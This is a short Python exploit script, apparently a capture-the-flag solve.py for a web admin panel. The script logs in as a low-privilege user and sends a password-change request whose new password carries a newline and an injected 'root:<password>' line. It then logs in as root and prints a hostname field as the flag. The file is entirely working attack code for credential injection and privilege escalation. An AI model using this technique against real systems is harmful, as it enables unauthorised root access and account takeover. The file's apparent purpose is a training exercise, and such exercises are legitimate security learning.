#!/bin/env python3

import requests
import argparse
import json


def main(args):
    url = args["url"]
    password = args["password"]

    token, cookie = login(url, "www-data", "www-data")
    do_exploit(url, password, token, cookie)

    token, cookie = login(url, "root", password)
    retrieve_flag(url, token, cookie)


def login(host, username, password):
    url = host + "/login.php"
    myobj = {"username": username, "password": password}

    x = requests.post(url, json=myobj)

    return json.loads(x.text)["data"]["token"], x.cookies["CKSESSIONID"]


def do_exploit(url, password, token, cookie):
    cookies = {
        "CKSESSIONID": cookie,
    }

    headers = {
        "X-Access-Token": token,
    }

    data = '{"old_password":"www-data","new_password":"password1\\nroot:%s"}' % (
        password
    )

    requests.post(url + "/api/account", cookies=cookies, headers=headers, data=data)


def retrieve_flag(url, token, cookie):
    cookies = {
        "CKSESSIONID": cookie,
    }

    headers = {
        "X-Access-Token": token,
    }

    response = requests.get(url + "/api/status", cookies=cookies, headers=headers)

    print(json.loads(response.text)["data"][0]["hostname"])


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Example:\n python3 solve.py -u http://127.0.0.1:9090 -p password1\n"
    )
    parser.add_argument(
        "-u",
        "--url",
        help="Target host and port. e.g. http://127.0.0.1:9090",
        required=True,
    )
    parser.add_argument(
        "-p", "--password", help="Root password to set. e.g. password1 ", required=True
    )

    args = vars(parser.parse_args())
    main(args)
